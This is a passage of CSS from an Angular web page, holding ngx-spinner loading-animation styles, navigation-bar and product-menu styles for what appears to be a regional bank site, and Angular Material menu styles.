    .la-pacman[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      -webkit-animation-delay: -1.44s;
      animation-delay: -1.44s
    }

    .la-pacman[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      -webkit-animation-delay: -1.94s;
      animation-delay: -1.94s
    }

    .la-pacman[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      -webkit-animation-delay: -2.44s;
      animation-delay: -2.44s
    }

    .la-pacman[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      -webkit-animation-delay: -2.94s;
      animation-delay: -2.94s
    }

    .la-pacman.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-pacman.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child,
    .la-pacman.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      border-width: 8px;
      position: absolute
    }

    .la-pacman.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      top: 0
    }

    .la-pacman.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3),
    .la-pacman.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4),
    .la-pacman.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5),
    .la-pacman.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      width: 4px;
      height: 4px
    }

    .la-pacman.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-pacman.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child,
    .la-pacman.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      border-width: 32px;
      position: absolute
    }

    .la-pacman.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      top: 0
    }

    .la-pacman.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3),
    .la-pacman.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4),
    .la-pacman.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5),
    .la-pacman.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      width: 16px;
      height: 16px
    }

    .la-pacman.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-pacman.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child,
    .la-pacman.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      border-width: 48px;
      position: absolute
    }

    .la-pacman.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      top: 0
    }

    .la-pacman.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3),
    .la-pacman.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4),
    .la-pacman.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5),
    .la-pacman.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      width: 24px;
      height: 24px
    }

    @-webkit-keyframes pacman-rotate-half-up {

      0%,
      to {
        transform: rotate(270deg)
      }

      50% {
        transform: rotate(1turn)
      }
    }

    @keyframes pacman-rotate-half-up {

      0%,
      to {
        transform: rotate(270deg)
      }

      50% {
        transform: rotate(1turn)
      }
    }

    @-webkit-keyframes pacman-rotate-half-down {

      0%,
      to {
        transform: rotate(90deg)
      }

      50% {
        transform: rotate(0deg)
      }
    }

    @keyframes pacman-rotate-half-down {

      0%,
      to {
        transform: rotate(90deg)
      }

      50% {
        transform: rotate(0deg)
      }
    }

    @-webkit-keyframes pacman-balls {
      0% {
        left: 200%;
        opacity: 0;
        transform: translateY(-50%)
      }

      5% {
        opacity: .5
      }

      66% {
        opacity: 1
      }

      67% {
        opacity: 0
      }

      to {
        left: 0;
        transform: translateY(-50%)
      }
    }

    @keyframes pacman-balls {
      0% {
        left: 200%;
        opacity: 0;
        transform: translateY(-50%)
      }

      5% {
        opacity: .5
      }

      66% {
        opacity: 1
      }

      67% {
        opacity: 0
      }

      to {
        left: 0;
        transform: translateY(-50%)
      }
    }

    .la-square-jelly-box[_ngcontent-oeb-c134],
    .la-square-jelly-box[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-square-jelly-box[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-square-jelly-box.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-square-jelly-box[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-square-jelly-box[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-square-jelly-box[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child,
    .la-square-jelly-box[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      position: absolute;
      left: 0;
      width: 100%
    }

    .la-square-jelly-box[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      top: -25%;
      z-index: 1;
      height: 100%;
      border-radius: 10%;
      -webkit-animation: square-jelly-box-animate .6s linear -.1s infinite;
      animation: square-jelly-box-animate .6s linear -.1s infinite
    }

    .la-square-jelly-box[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      bottom: -9%;
      height: 10%;
      background: #000;
      border-radius: 50%;
      opacity: .2;
      -webkit-animation: square-jelly-box-shadow .6s linear -.1s infinite;
      animation: square-jelly-box-shadow .6s linear -.1s infinite
    }

    .la-square-jelly-box.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-square-jelly-box.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-square-jelly-box.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    @-webkit-keyframes square-jelly-box-animate {
      17% {
        border-bottom-right-radius: 10%
      }

      25% {
        transform: translateY(25%) rotate(22.5deg)
      }

      50% {
        border-bottom-right-radius: 100%;
        transform: translateY(50%) scaleY(.9) rotate(45deg)
      }

      75% {
        transform: translateY(25%) rotate(67.5deg)
      }

      to {
        transform: translateY(0) rotate(90deg)
      }
    }

    @keyframes square-jelly-box-animate {
      17% {
        border-bottom-right-radius: 10%
      }

      25% {
        transform: translateY(25%) rotate(22.5deg)
      }

      50% {
        border-bottom-right-radius: 100%;
        transform: translateY(50%) scaleY(.9) rotate(45deg)
      }

      75% {
        transform: translateY(25%) rotate(67.5deg)
      }

      to {
        transform: translateY(0) rotate(90deg)
      }
    }

    @-webkit-keyframes square-jelly-box-shadow {
      50% {
        transform: scaleX(1.25)
      }
    }

    @keyframes square-jelly-box-shadow {
      50% {
        transform: scaleX(1.25)
      }
    }

    .la-square-loader[_ngcontent-oeb-c134],
    .la-square-loader[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-square-loader[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-square-loader.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-square-loader[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-square-loader[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-square-loader[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 100%;
      height: 100%;
      background: transparent;
      border-width: 2px;
      border-radius: 0;
      -webkit-animation: square-loader 2s ease infinite;
      animation: square-loader 2s ease infinite
    }

    .la-square-loader[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:after {
      display: inline-block;
      width: 100%;
      vertical-align: top;
      content: "";
      background-color: currentColor;
      -webkit-animation: square-loader-inner 2s ease-in infinite;
      animation: square-loader-inner 2s ease-in infinite
    }

    .la-square-loader.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-square-loader.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      border-width: 1px
    }

    .la-square-loader.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-square-loader.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      border-width: 4px
    }

    .la-square-loader.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-square-loader.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      border-width: 6px
    }

    @-webkit-keyframes square-loader {
      0% {
        transform: rotate(0deg)
      }

      25% {
        transform: rotate(180deg)
      }

      50% {
        transform: rotate(180deg)
      }

      75% {
        transform: rotate(1turn)
      }

      to {
        transform: rotate(1turn)
      }
    }

    @keyframes square-loader {
      0% {
        transform: rotate(0deg)
      }

      25% {
        transform: rotate(180deg)
      }

      50% {
        transform: rotate(180deg)
      }

      75% {
        transform: rotate(1turn)
      }

      to {
        transform: rotate(1turn)
      }
    }

    @-webkit-keyframes square-loader-inner {
      0% {
        height: 0
      }

      25% {
        height: 0
      }

      50% {
        height: 100%
      }

      75% {
        height: 100%
      }

      to {
        height: 0
      }
    }

    @keyframes square-loader-inner {
      0% {
        height: 0
      }

      25% {
        height: 0
      }

      50% {
        height: 100%
      }

      75% {
        height: 100%
      }

      to {
        height: 0
      }
    }

    .la-square-spin[_ngcontent-oeb-c134],
    .la-square-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-square-spin[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-square-spin.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-square-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-square-spin[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-square-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 100%;
      height: 100%;
      border-radius: 0;
      -webkit-animation: square-spin 3s cubic-bezier(.09, .57, .49, .9) 0s infinite;
      animation: square-spin 3s cubic-bezier(.09, .57, .49, .9) 0s infinite
    }

    .la-square-spin.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-square-spin.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-square-spin.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    @-webkit-keyframes square-spin {
      0% {
        transform: perspective(100px) rotateX(0) rotateY(0)
      }

      25% {
        transform: perspective(100px) rotateX(180deg) rotateY(0)
      }

      50% {
        transform: perspective(100px) rotateX(180deg) rotateY(180deg)
      }

      75% {
        transform: perspective(100px) rotateX(0) rotateY(180deg)
      }

      to {
        transform: perspective(100px) rotateX(0) rotateY(1turn)
      }
    }

    @keyframes square-spin {
      0% {
        transform: perspective(100px) rotateX(0) rotateY(0)
      }

      25% {
        transform: perspective(100px) rotateX(180deg) rotateY(0)
      }

      50% {
        transform: perspective(100px) rotateX(180deg) rotateY(180deg)
      }

      75% {
        transform: perspective(100px) rotateX(0) rotateY(180deg)
      }

      to {
        transform: perspective(100px) rotateX(0) rotateY(1turn)
      }
    }

    .la-timer[_ngcontent-oeb-c134],
    .la-timer[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-timer[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-timer.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-timer[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-timer[_ngcontent-oeb-c134],
    .la-timer[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-timer[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      background: transparent;
      border-width: 2px;
      border-radius: 100%
    }

    .la-timer[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:after,
    .la-timer[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:before {
      position: absolute;
      top: 14px;
      left: 14px;
      display: block;
      width: 2px;
      margin-top: -1px;
      margin-left: -1px;
      content: "";
      background: currentColor;
      border-radius: 2px;
      transform-origin: 1px 1px 0;
      -webkit-animation: timer-loader 1.25s linear infinite;
      animation: timer-loader 1.25s linear infinite;
      -webkit-animation-delay: -625ms;
      animation-delay: -625ms
    }

    .la-timer[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:before {
      height: 12px
    }

    .la-timer[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:after {
      height: 8px;
      -webkit-animation-duration: 15s;
      animation-duration: 15s;
      -webkit-animation-delay: -7.5s;
      animation-delay: -7.5s
    }

    .la-timer.la-sm[_ngcontent-oeb-c134],
    .la-timer.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-timer.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      border-width: 1px
    }

    .la-timer.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:after,
    .la-timer.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:before {
      top: 7px;
      left: 7px;
      width: 1px;
      margin-top: -.5px;
      margin-left: -.5px;
      border-radius: 1px;
      transform-origin: .5px .5px 0
    }

    .la-timer.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:before {
      height: 6px
    }

    .la-timer.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:after {
      height: 4px
    }

    .la-timer.la-2x[_ngcontent-oeb-c134],
    .la-timer.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-timer.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      border-width: 4px
    }

    .la-timer.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:after,
    .la-timer.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:before {
      top: 28px;
      left: 28px;
      width: 4px;
      margin-top: -2px;
      margin-left: -2px;
      border-radius: 4px;
      transform-origin: 2px 2px 0
    }

    .la-timer.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:before {
      height: 24px
    }

    .la-timer.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:after {
      height: 16px
    }

    .la-timer.la-3x[_ngcontent-oeb-c134],
    .la-timer.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-timer.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      border-width: 6px
    }

    .la-timer.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:after,
    .la-timer.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:before {
      top: 42px;
      left: 42px;
      width: 6px;
      margin-top: -3px;
      margin-left: -3px;
      border-radius: 6px;
      transform-origin: 3px 3px 0
    }

    .la-timer.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:before {
      height: 36px
    }

    .la-timer.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:after {
      height: 24px
    }

    @-webkit-keyframes timer-loader {
      0% {
        transform: rotate(0deg)
      }

      to {
        transform: rotate(1turn)
      }
    }

    @keyframes timer-loader {
      0% {
        transform: rotate(0deg)
      }

      to {
        transform: rotate(1turn)
      }
    }

    .la-triangle-skew-spin[_ngcontent-oeb-c134],
    .la-triangle-skew-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-triangle-skew-spin[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-triangle-skew-spin.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-triangle-skew-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-triangle-skew-spin[_ngcontent-oeb-c134] {
      width: 32px;
      height: 16px
    }

    .la-triangle-skew-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 0;
      height: 0;
      background: transparent;
      border-left: none;
      border-right: none;
      border-color: currentcolor transparent;
      border-style: solid;
      border-width: 0 16px 16px;
      -webkit-animation: triangle-skew-spin 3s cubic-bezier(.09, .57, .49, .9) 0s infinite;
      animation: triangle-skew-spin 3s cubic-bezier(.09, .57, .49, .9) 0s infinite
    }

    .la-triangle-skew-spin.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 8px
    }

    .la-triangle-skew-spin.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      border-width: 0 8px 8px
    }

    .la-triangle-skew-spin.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 32px
    }

    .la-triangle-skew-spin.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      border-width: 0 32px 32px
    }

    .la-triangle-skew-spin.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 48px
    }

    .la-triangle-skew-spin.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      border-width: 0 48px 48px
    }

    @-webkit-keyframes triangle-skew-spin {
      0% {
        transform: perspective(100px) rotateX(0) rotateY(0)
      }

      25% {
        transform: perspective(100px) rotateX(180deg) rotateY(0)
      }

      50% {
        transform: perspective(100px) rotateX(180deg) rotateY(180deg)
      }

      75% {
        transform: perspective(100px) rotateX(0) rotateY(180deg)
      }

      to {
        transform: perspective(100px) rotateX(0) rotateY(1turn)
      }
    }

    @keyframes triangle-skew-spin {
      0% {
        transform: perspective(100px) rotateX(0) rotateY(0)
      }

      25% {
        transform: perspective(100px) rotateX(180deg) rotateY(0)
      }

      50% {
        transform: perspective(100px) rotateX(180deg) rotateY(180deg)
      }

      75% {
        transform: perspective(100px) rotateX(0) rotateY(180deg)
      }

      to {
        transform: perspective(100px) rotateX(0) rotateY(1turn)
      }
    }

    .ngx-spinner-overlay[_ngcontent-oeb-c134] {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%
    }

    .ngx-spinner-overlay[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:not(.loading-text) {
      top: 50%;
      left: 50%;
      margin: 0;
      position: absolute;
      transform: translate(-50%, -50%)
    }

    .loading-text[_ngcontent-oeb-c134] {
      position: absolute;
      top: 60%;
      left: 50%;
      transform: translate(-50%, -60%)
    }
  </style>
  <style>
    nav[_ngcontent-oeb-c184] {
      border-bottom: none !important;
      padding: .5rem 1rem;
      z-index: 1000 !important;
      min-height: 80px
    }

    nav[_ngcontent-oeb-c184] a.navbar-brand[_ngcontent-oeb-c184] div[_ngcontent-oeb-c184] img[_ngcontent-oeb-c184] {
      width: 143px !important;
      height: auto !important
    }

    .corporate-image nav.public-navbar {
      border-bottom: none !important;
      padding: .5rem 2rem;
      z-index: 1000 !important;
      min-height: 80px;
      background-color: var(--primary-color) !important;
      box-shadow: 0 3px 6px #00000029
    }

    @media screen and (min-width: 692px) {
      .corporate-image nav.public-navbar {
        padding: .5rem 3rem
      }
    }

    @media screen and (min-width: 992px) {
      .corporate-image nav.public-navbar {
        padding: .5rem 8.5%
      }
    }

    .corporate-image nav.public-navbar a.navbar-brand>img {
      width: 143px !important;
      height: auto
    }

    .corporate-image .login li.nav-item .nav-link {
      letter-spacing: 0px;
      margin: 0 15px;
      display: inline-block
    }

    ul.navbar-nav[_ngcontent-oeb-c184] {
      margin-left: auto;
      overflow-y: auto;
      max-height: calc(100vh - 96px)
    }

    [_nghost-oeb-c184] li.nav-item a.nav-link:hover,
    [_nghost-oeb-c184] byte-product-list li.nav-item .nav-link:hover,
    [_nghost-oeb-c184] byte-language-list li.nav-item .nav-link:hover {
      box-shadow: inset 0 -3px 0 var(--border-hover-tertiary) !important
    }

    li.nav-item[_ngcontent-oeb-c184] .nav-link[_ngcontent-oeb-c184],
    [_nghost-oeb-c184] byte-product-list li.nav-item .nav-link,
    [_nghost-oeb-c184] byte-language-list li.nav-item .nav-link {
      letter-spacing: 0px;
      margin: 0 15px;
      display: inline-block
    }

    li.nav-item.sub[_ngcontent-oeb-c184] .nav-link[_ngcontent-oeb-c184],
    [_nghost-oeb-c184] byte-product-list li.nav-item.sub .nav-link,
    [_nghost-oeb-c184] byte-language-list li.nav-item.sub .nav-link {
      font-weight: 400
    }

    @media (max-width: 767px) {
      nav[_ngcontent-oeb-c184] img[_ngcontent-oeb-c184] {
        width: 130px;
        height: auto
      }

      .corporate-image[_ngcontent-oeb-c184] .login.banca-regional-menu[_ngcontent-oeb-c184]:before {
        color: var(--primary-color)
      }
    }

    @media (min-width: 768px) and (max-width: 991px) {
      nav[_ngcontent-oeb-c184] img[_ngcontent-oeb-c184] {
        width: 143px
      }
    }

    @media (min-width: 992px) {
      ul.navbar-nav[_ngcontent-oeb-c184] {
        overflow-y: hidden
      }

      li.nav-item[_ngcontent-oeb-c184] .nav-link[_ngcontent-oeb-c184],
      [_nghost-oeb-c184] byte-product-list li.nav-item .nav-link,
      [_nghost-oeb-c184] byte-language-list li.nav-item .nav-link {
        font-size: 14px !important;
        line-height: 17px !important;
        text-align: center !important;
        margin: 0 25px
      }

      nav[_ngcontent-oeb-c184] {
        height: 80px;
        padding-left: 75px;
        padding-right: 75px
      }

      nav[_ngcontent-oeb-c184] a.navbar-brand[_ngcontent-oeb-c184]>img[_ngcontent-oeb-c184] {
        margin: 20px 0 20px 30%;
        width: 143px;
        height: auto
      }
    }

    @media (min-width: 1200px) {
      nav[_ngcontent-oeb-c184] {
        padding-left: 157px;
        padding-right: 157px
      }
    }

    .bp-ci[_ngcontent-oeb-c184] a.navbar-brand[_ngcontent-oeb-c184] div[_ngcontent-oeb-c184] img[_ngcontent-oeb-c184] {
      width: 143px !important;
      height: auto !important
    }

    @media (max-width: 991px) {
      .bp-ci[_ngcontent-oeb-c184] .navbar[_ngcontent-oeb-c184] {
        display: flex;
        position: relative;
        align-items: center
      }

      .bp-ci[_ngcontent-oeb-c184] .navbar-expand-lg[_ngcontent-oeb-c184] {
        height: 128px;
        flex-flow: row nowrap;
        justify-content: flex-start
      }

      .bp-ci[_ngcontent-oeb-c184] .navbar-brand[_ngcontent-oeb-c184] {
        margin-right: 1rem;
        font-size: 1.25rem;
        white-space: nowrap;
        line-height: inherit;
        display: inline-block;
        padding-top: .3125rem;
        padding-bottom: .3125rem
      }

      .bp-ci[_ngcontent-oeb-c184] .navbar-expand-lg[_ngcontent-oeb-c184] .navbar-collapse[_ngcontent-oeb-c184] {
        flex-basis: auto;
        display: flex !important
      }

      .bp-ci[_ngcontent-oeb-c184] .navbar-collapse[_ngcontent-oeb-c184] {
        flex-grow: 1;
        flex-basis: 100%;
        align-items: center
      }

      .bp-ci[_ngcontent-oeb-c184] .navbar-nav[_ngcontent-oeb-c184] {
        display: flex;
        padding-left: 0;
        margin-bottom: 0;
        flex-direction: column;
        list-style: none !important
      }

      .bp-ci[_ngcontent-oeb-c184] .corporate-image[_ngcontent-oeb-c184] ul[_ngcontent-oeb-c184] {
        padding-left: 10px !important;
        padding-right: 10px !important
      }

      .bp-ci[_ngcontent-oeb-c184] .navbar-expand-lg[_ngcontent-oeb-c184] .navbar-nav[_ngcontent-oeb-c184] {
        flex-direction: row
      }

      .bp-ci[_ngcontent-oeb-c184] ul.navbar-nav[_ngcontent-wan-c250][_ngcontent-oeb-c184] {
        margin-left: auto;
        max-height: calc(100vh - 96px)
      }

      .bp-ci[_ngcontent-oeb-c184] ul.navbar-nav[_ngcontent-wan-c250][_ngcontent-oeb-c184] {
        overflow-y: hidden
      }

      .bp-ci[_ngcontent-oeb-c184] li.nav-item[_ngcontent-oeb-c184] .nav-link[_ngcontent-oeb-c184] {
        font: normal normal bold 14px/16px var(--font-family) !important
      }

      .bp-ci[_ngcontent-oeb-c184] li.nav-item[_ngcontent-oeb-c184] .nav-link[_ngcontent-oeb-c184]::hover {
        box-shadow: inset 0 -3px 0 var(--border-hover-tertiary) !important
      }
    }

    @media (max-width: 430px) {
      .bp-ci[_ngcontent-oeb-c184] a.navbar-brand[_ngcontent-oeb-c184] div[_ngcontent-oeb-c184] img[_ngcontent-oeb-c184] {
        width: 172px !important;
        height: auto !important
      }

      .bp-ci[_ngcontent-oeb-c184] .navbar-expand-lg[_ngcontent-oeb-c184] {
        height: 202px;
        flex-flow: column
      }

      .bp-ci[_ngcontent-oeb-c184] .navbar-brand[_ngcontent-oeb-c184] {
        width: 100%;
        display: flex;
        margin-right: 0;
        align-items: center;
        justify-content: center
      }

      .bp-ci[_ngcontent-oeb-c184] .navbar-brand[_ngcontent-oeb-c184] div[_ngcontent-oeb-c184] img[_ngcontent-oeb-c184] {
        width: 172 !important;
        height: auto !important
      }

      .bp-ci[_ngcontent-oeb-c184] .navbar-nav[_ngcontent-oeb-c184] {
        gap: 10px;
        padding: 0;
        display: grid;
        text-align: center;
        justify-content: center;
        grid-template-columns: repeat(3, 1fr)
      }

      .bp-ci[_ngcontent-oeb-c184] .navbar-nav[_ngcontent-oeb-c184] li.nav-item[_ngcontent-oeb-c184]:nth-child(n+3) {
        grid-column: span 1
      }

      .bp-ci[_ngcontent-oeb-c184] .navbar-nav[_ngcontent-oeb-c184] li.nav-item[_ngcontent-oeb-c184]:nth-child(n+4) {
        grid-column: span 3
      }
    }
  </style>
  <style>
    a.nav-link,
    a.nav-link:hover {
      color: inherit
    }

    a.animated-border:after,
    span.animated-border:after {
      bottom: -7px !important;
      background: var(--color-tertiary) !important
    }

    i.fa-angle-up,
    i.fa-angle-down {
      margin-left: 5px
    }

    .banca-regional-flecha-derecha {
      display: inline-block;
      font-size: 13px;
      margin-left: 5px
    }

    .banca-regional-flecha-derecha.up {
      transform: rotate(270deg)
    }

    .banca-regional-flecha-derecha.down {
      transform: rotate(90deg)
    }

    .product-options {
      padding: 0
    }

    .menu-overflow-hidden {
      overflow: hidden !important;
      box-shadow: none;
      width: 230px
    }

    .product-button {
      margin: 7px 5px;
      height: auto !important;
      min-height: 35px;
      line-height: 0 !important;
      padding-right: 22px !important
    }

    .product-detail {
      white-space: pre-line;
      line-height: 1.5em
    }

    .container-product-list::-webkit-scrollbar {
      width: 10px
    }

    .container-product-list::-webkit-scrollbar-track {
      background-color: var(--primary-color)
    }

    .container-product-list::-webkit-scrollbar-thumb {
      background-color: var(--primary-color);
      border-radius: 10px;
      block-size: 3.125rem
    }

    .product-list {
      box-shadow: none
    }

    .product-list .product-detail {
      color: #fff;
      font: 700 16px/19px Lato, monospace, sans-serif;
      font-weight: 400
    }

    .product-list.menu-overflow-hidden {
      background: var(--primary-color) 0% 0% no-repeat padding-box;
      box-shadow: 0 3px 6px #00000029 !important;
      opacity: 1 !important
    }

    .product-list.menu-overflow-hidden .product-button {
      color: var(--color-navbar) !important;
      font: Lato, monospace, sans-serif;
      font-weight: 400
    }

    .product-list>div {
      margin-top: 37px;
      margin-bottom: 20px
    }

    .corporate-image ul {
      padding-left: 10px !important;
      padding-right: 10px !important
    }

    .corporate-image.bisv .product-list.menu-overflow-hidden {
      position: absolute !important;
      min-height: 630px !important
    }

    .navbar-nav .nav-item {
      padding: 0;
      list-style: none !important
    }

    .corporate-image ul #isNewMenu {
      padding: 0 !important
    }

    @media (max-width: 991px) {

      li.nav-item .nav-link,
      li.nav-item .nav-linka {
        font: 700 14px/16px Lato, monospace, sans-serif !important
      }

      .corporate-image ul #isNewMenu {
        padding: 0 !important
      }
    }

    @media (max-width: 990px) {
      span.animated-border-mobile {
        position: unset !important
      }
    }
  </style>
  <style>
    .active[_ngcontent-oeb-c124] {
      font-weight: 700
    }

    a.default[_ngcontent-oeb-c124] {
      color: inherit
    }

    .dropdown-select[_ngcontent-oeb-c124]>div[_ngcontent-oeb-c124] {
      box-shadow: -1px 3px 3px #56607573;
      z-index: 9999
    }

    .dropdown-select[_ngcontent-oeb-c124]>div[_ngcontent-oeb-c124] a[_ngcontent-oeb-c124] {
      padding: 10px 20px
    }
  </style>
  <style>
    .mat-menu-panel {
      min-width: 112px;
      max-width: 280px;
      overflow: auto;
      -webkit-overflow-scrolling: touch;
      max-height: calc(100vh - 48px);
      border-radius: 4px;
      outline: 0;
      min-height: 64px
    }

    .mat-menu-panel.ng-animating {
      pointer-events: none
    }

    @media (-ms-high-contrast:active) {
      .mat-menu-panel {
        outline: solid 1px
      }
    }

    .mat-menu-content:not(:empty) {
      padding-top: 8px;
      padding-bottom: 8px
    }

    .mat-menu-item {
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
      cursor: pointer;
      outline: 0;
      border: none;
      -webkit-tap-highlight-color: transparent;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      display: block;
      line-height: 48px;
      height: 48px;
      padding: 0 16px;
      text-align: left;
